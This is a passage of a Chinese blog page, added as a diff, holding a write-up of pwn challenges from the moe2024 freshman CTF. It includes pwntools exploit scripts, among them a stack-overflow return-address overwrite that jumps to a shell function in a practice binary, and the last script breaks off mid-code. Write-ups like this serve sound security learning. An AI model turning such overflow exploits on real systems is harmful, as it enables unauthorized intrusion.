@@ -1,0 +1,1205 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xyyr.png">
+  <link rel="icon" href="/img/xyyr.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xyyr">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="moe2024新生赛–pwn篇[TOC] 1 二进制漏洞审计入门指北nc直取(不过一点点打印出来确实有点带感，让普普通通的命令行打印更加，唔，酷？…好吧，一点点打印只是因为与服务器有延迟，我还以为特地这么设计的呢，我是呆逼)  2 NotEnoughTime先是一点正则表达式的解释—来自gpt 这个正则表达式 r&#39;[-+&#x2F;*]?\s*\d+&#39; 用来从给定的字符串中提取数字和前面的运">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xyyr">
+<meta property="og:url" content="https://xyyr-c.github.io/2024/10/23/moe2024%E6%96%B0%E7%94%9F%E8%B5%9B--pwn%E7%AF%87/index.html">
+<meta property="og:site_name" content="xyyr">
+<meta property="og:description" content="moe2024新生赛–pwn篇[TOC] 1 二进制漏洞审计入门指北nc直取(不过一点点打印出来确实有点带感，让普普通通的命令行打印更加，唔，酷？…好吧，一点点打印只是因为与服务器有延迟，我还以为特地这么设计的呢，我是呆逼)  2 NotEnoughTime先是一点正则表达式的解释—来自gpt 这个正则表达式 r&#39;[-+&#x2F;*]?\s*\d+&#39; 用来从给定的字符串中提取数字和前面的运">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409172210281.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181303966.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181312991.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181613307.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181645088.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181657463.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181739628.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181739111.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181739235.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181740053.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181741287.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181743522.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182226330.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182229029.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182233403.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182234200.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182234976.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182240807.png">
+<meta property="og:image" content="c:/Users/czy/AppData/Roaming/Typora/typora-user-images/image-20240919215159756.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409192208848.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409192207952.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201039522.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201042234.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201119431.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201720224.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201720040.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201954424.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202026591.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202038547.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202114002.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202322159.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202322455.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202323352.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211535725.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211534543.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211556221.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211608118.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211630431.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211642908.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211723129.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409221643880.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409221720115.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409221737200.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409221740725.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222126301.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222206631.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222217920.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222213767.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222237799.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222238308.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222241496.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409231721115.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409231723508.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409231724679.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409241304481.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409241305339.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409241317602.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242146176.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242152752.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242204889.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242219067.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242225620.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242300702.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251329369.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251330705.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251333138.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251345608.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251356927.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251405976.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251405873.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251619894.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251623048.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251710944.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301716995.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301738979.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301759505.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301805326.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301806882.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301808199.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301817555.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301823236.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031529091.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031529452.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031530646.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031532058.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031535849.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031549620.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031635572.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031704505.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031844858.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031906999.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032019428.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032031341.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032033229.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032039258.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032144974.png">
+<meta property="article:published_time" content="2024-10-23T09:00:02.168Z">
+<meta property="article:modified_time" content="2024-10-03T14:24:54.173Z">
+<meta property="article:author" content="xyyr">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409172210281.png">
+  
+  
+  
+  <title>xyyr</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/links.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xyyr-c.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xyyr</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-23 17:00" pubdate>
+          2024年10月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          72 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年10月3日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="moe2024新生赛–pwn篇"><a href="#moe2024新生赛–pwn篇" class="headerlink" title="moe2024新生赛–pwn篇"></a>moe2024新生赛–pwn篇</h3><p>[TOC]</p>
+<h4 id="1-二进制漏洞审计入门指北"><a href="#1-二进制漏洞审计入门指北" class="headerlink" title="1 二进制漏洞审计入门指北"></a><strong>1 二进制漏洞审计入门指北</strong></h4><p>nc直取<del>(不过一点点打印出来确实有点带感，让普普通通的命令行打印更加，唔，酷？…好吧，一点点打印只是因为与服务器有延迟，我还以为特地这么设计的呢，我是呆逼)</del></p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409172210281.png" srcset="/img/loading.gif" lazyload alt="image-20240917220957194"></p>
+<h4 id="2-NotEnoughTime"><a href="#2-NotEnoughTime" class="headerlink" title="2 NotEnoughTime"></a>2 NotEnoughTime</h4><p>先是一点正则表达式的解释—来自gpt</p>
+<p>这个正则表达式 <code>r&#39;[-+/*]?\s*\d+&#39;</code> 用来从给定的字符串中提取数字和前面的运算符，详细解释如下：</p>
+<ol>
+<li><code>[]</code> (字符类)</li>
+</ol>
+<ul>
+<li>方括号 <code>[]</code> 用于定义一个<strong>字符类</strong>，匹配方括号中的任何一个字符。</li>
+<li>在这里，<code>[-+/*]</code> 匹配<strong>减号</strong>(<code>-</code>)、<strong>加号</strong>(<code>+</code>)、<strong>除号</strong>(<code>/</code>)、<strong>乘号</strong>(<code>*</code>) 这四种运算符中的任意一个。</li>
+<li>注意：减号 <code>-</code> 在字符类中放在首位，因为 <code>-</code> 在中间可能会被解释为一个范围（如 <code>[a-z]</code> 表示从 <code>a</code> 到 <code>z</code> 之间的字符）。</li>
+</ul>
+<ol start="2">
+<li><code>?</code> (零次或一次)</li>
+</ol>
+<ul>
+<li><code>?</code> 是量词，用来匹配前面的内容<strong>零次或一次</strong>。在这个表达式里，<code>[-+/*]?</code> 表示<strong>可能有</strong>一个运算符，也可能没有。</li>
+<li>这意味着可以匹配诸如 <code>+3</code>、<code>-5</code> 或者 <code>6</code> 这样的数字，前面的运算符是可选的。</li>
+</ul>
+<ol start="3">
+<li><code>\s*</code> (零次或多次空白字符)</li>
+</ol>
+<ul>
+<li><code>\s</code> 匹配<strong>空白字符</strong>，包括空格、制表符、换行符等。</li>
+<li><code>*</code> 是量词，表示前面的空白字符可以出现<strong>零次或多次</strong>。</li>
+<li>所以 <code>\s*</code> 意味着可以有空格或没有空格，也就是忽略了数字和运算符之间的空白。</li>
+</ul>
+<ol start="4">
+<li><code>\d+</code> (一位或多位数字)</li>
+</ol>
+<ul>
+<li><code>\d</code> 匹配<strong>任意数字</strong>，即 <code>0-9</code> 的数字。</li>
+<li><code>+</code> 是量词，表示前面的数字字符可以出现<strong>一次或多次</strong>。因此，<code>\d+</code> 匹配的是<strong>一个或多个数字</strong>，例如 <code>5</code>、<code>123</code>。</li>
+</ul>
+<p> 结合在一起的解释：</p>
+<ul>
+<li><code>[-+/*]?\s*\d+</code> 这个正则表达式的含义是：<ul>
+<li><strong>可选的</strong>运算符 <code>-</code>, <code>+</code>, <code>/</code>, <code>*</code>（零次或一次）。</li>
+<li><strong>可选的</strong>空白字符（零次或多次）。</li>
+<li><strong>一个或多个数字</strong>。</li>
+</ul>
+</li>
+</ul>
+<p>因此，它可以匹配如下形式的片段：</p>
+<ul>
+<li><code>250</code></li>
+<li><code>-655</code></li>
+<li><code>+395</code></li>
+<li><code> /399</code>（带有空格）</li>
+</ul>
+<p>正则表达式相关的知识点：</p>
+<ol>
+<li><p><strong>正则表达式的基本语法</strong>：</p>
+<ul>
+<li>使用字符类 <code>[]</code> 来定义一个可能匹配的字符集。</li>
+<li>使用 <code>?</code>, <code>*</code>, <code>+</code> 等量词来控制字符的重复次数。</li>
+<li>使用转义字符如 <code>\d</code> 来表示某一类字符（例如数字）。</li>
+</ul>
+</li>
+<li><p><strong>字符类匹配</strong>：</p>
+<ul>
+<li><code>[-+/*]</code> 中的 <code>-</code> 表示减号，而不是字符范围。若要匹配减号，通常放在字符类的第一个位置避免歧义。</li>
+</ul>
+</li>
+<li><p><strong>量词控制</strong>：</p>
+<ul>
+<li><code>?</code> 量词在这里用于处理数字前的运算符是否存在的情况。</li>
+</ul>
+</li>
+<li><p><strong>空白字符的忽略</strong>：</p>
+<ul>
+<li><code>\s*</code> 的使用使得数学式中的空白字符可以被忽略，确保提取表达式时不受空格干扰。</li>
+</ul>
+</li>
+</ol>
+<p>通过这些知识，正则表达式可以帮助你准确地提取数学表达式中的有效数字和符号部分。</p>
+<p>注意向下取整即可，不能直接用int取整数位（因为会有负数），注意要解码后才能使用</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> math<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">41661</span>)<br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>rl()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">22</span>):<br>    strs = ru(<span class="hljs-string">&#x27;=&#x27;</span>)<br>    strs = re.findall(<span class="hljs-string">r&#x27;[-+/*]?\s*\d+&#x27;</span>,strs.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    strs = <span class="hljs-string">&#x27;&#x27;</span>.join(strs)<br>    <span class="hljs-built_in">print</span>(strs)<br>    <span class="hljs-comment">#pause()</span><br>    success(<span class="hljs-string">f&quot;it is the times :<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>    sl(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(math.floor((<span class="hljs-built_in">eval</span>(strs))))))<br>    <span class="hljs-comment">#sleep(0.1)</span><br><br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="3-no-more-gets"><a href="#3-no-more-gets" class="headerlink" title="3 no_more_gets"></a>3 no_more_gets</h4><p>栈溢出跳转shell（注意栈平衡）</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181303966.png" srcset="/img/loading.gif" lazyload alt="image-20240918130322893"></p>
+<p>exp:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./lockedshell&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">46363</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>back=<span class="hljs-number">0x0401193</span><br>payload = b<span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0x58</span>)+p64(back)<br><br><span class="hljs-comment">#debug()</span><br>sl(payload)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="4-leak-sth"><a href="#4-leak-sth" class="headerlink" title="4 leak_sth"></a>4 leak_sth</h4><p>存在格式化字符串漏洞来泄露伪随机数，不过自身构建随机数也行</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181312991.png" srcset="/img/loading.gif" lazyload alt="image-20240918131238901"></p>
+<p>exp:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>from ctypes import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span 